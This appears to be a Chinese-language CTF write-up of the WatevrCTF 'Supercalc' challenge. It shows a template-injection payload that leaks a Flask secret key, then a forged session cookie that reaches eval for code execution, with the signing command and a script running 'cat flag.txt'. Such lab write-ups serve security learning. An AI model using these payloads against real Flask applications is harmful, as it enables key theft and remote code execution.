# WatevrCTF

## Supercalc

点开一个计算器，首先有个session,暂时不知道是啥，排除php

然后尝试报错构造``1/0``

```
Traceback (most recent call last):
  File &#34;somewhere&#34;, line something, in something
    result = 1/0
ZeroDivisionError: division by zero
```

应该是python写的，那么考虑一下flask-session

能解码出来

```
python2 flask_session_cookie_manager2.py decode -c .eJxFjcEKwjAQRH9l2JNCofYa8KZ-gSeNhzRd7GKawCYqtfTfbUHw-GZ4MxP1kkvSkcx1Ip86JkMNauyoIlZNuvBZnefW-Qc2Q8oFyp5jgXchILhctsZG4CSBYSmngd89K1uqECQy1qT0Eu8VJP5pdbBs5Wco2KOpdzZeWNNBXpIlxeP6btD9EO2Iz1LTfJu_m04-Tg.XqjwZw.qiHhU59NlW8GurKNxrRZyQzJN3M
{"history":[{"code":"1 / 0","error":"Traceback (most recent call last):\n  File \"somewhere\", line something, in something\n    result = 1/0\nZeroDivisionError: division by zero"}]}
```

暂时不知道怎么搞，去翻了一下源码...

发现计算器的eval进过``ast``的校验，直接ssti肯定是没戏的

但是我们可以利用``#``注释符来绕过检验，然后报错render的时候还是有机会ssti的

但是把下划线和引号都ban了,还是没法直接读

用config可以拿到secretkey了我们可以控制session

```
1/0#{{config}}
Traceback (most recent call last):
  File "somewhere", line something, in something
    result = 1/0#&lt;Config {&#39;ENV&#39;: &#39;production&#39;, &#39;DEBUG&#39;: False, &#39;TESTING&#39;: False, &#39;PROPAGATE_EXCEPTIONS&#39;: None, &#39;PRESERVE_CONTEXT_ON_EXCEPTION&#39;: None, &#39;SECRET_KEY&#39;: &#39;cded826a1e89925035cc05f0907855f7&#39;, &#39;PERMANENT_SESSION_LIFETIME&#39;: datetime.timedelta(31), &#39;USE_X_SENDFILE&#39;: False, &#39;SERVER_NAME&#39;: None, &#39;APPLICATION_ROOT&#39;: &#39;/&#39;, &#39;SESSION_COOKIE_NAME&#39;: &#39;session&#39;, &#39;SESSION_COOKIE_DOMAIN&#39;: False, &#39;SESSION_COOKIE_PATH&#39;: None, &#39;SESSION_COOKIE_HTTPONLY&#39;: True, &#39;SESSION_COOKIE_SECURE&#39;: False, &#39;SESSION_COOKIE_SAMESITE&#39;: None, &#39;SESSION_REFRESH_EACH_REQUEST&#39;: True, &#39;MAX_CONTENT_LENGTH&#39;: None, &#39;SEND_FILE_MAX_AGE_DEFAULT&#39;: datetime.timedelta(0, 43200), &#39;TRAP_BAD_REQUEST_ERRORS&#39;: None, &#39;TRAP_HTTP_EXCEPTIONS&#39;: False, &#39;EXPLAIN_TEMPLATE_LOADING&#39;: False, &#39;PREFERRED_URL_SCHEME&#39;: &#39;http&#39;, &#39;JSON_AS_ASCII&#39;: True, &#39;JSON_SORT_KEYS&#39;: True, &#39;JSONIFY_PRETTYPRINT_REGULAR&#39;: False, &#39;JSONIFY_MIMETYPE&#39;: &#39;application/json&#39;, &#39;TEMPLATES_AUTO_RELOAD&#39;: None, &#39;MAX_COOKIE_SIZE&#39;: 4093}&gt;
ZeroDivisionError: division by zero
```

然后又卡住了....

回去翻了一下源码

```python
    for calculation in session["history"]:
        history.append({**calculation})
        if not calculation.get("error"):
            history[-1]["result"] = eval(calculation["code"])

    return render_template("index.html", history=list(reversed(history)))
```

history里的代码可以直接执行，那么伪造session就可以rce了

```
 python3 flask_session_cookie_manager3.py encode -s "cded826a1e89925035cc05f0907855f7" -t "{'history':[{'code':'__import__(os).system(\"ls \")'}]}"
```

或者也可用这个脚本生成

```python
from flask.sessions import SecureCookieSessionInterface

secret_key = "cded826a1e89925035cc05f0907855f7"

class FakeApp:
    secret_key = secret_key


fake_app = FakeApp()
session_interface = SecureCookieSessionInterface()
serializer = session_interface.get_signing_serializer(fake_app)
cookie = serializer.dumps(
    {"history": [{"code": '__import__("os").popen("cat flag.txt").read()'}]}
)
print(cookie)
```

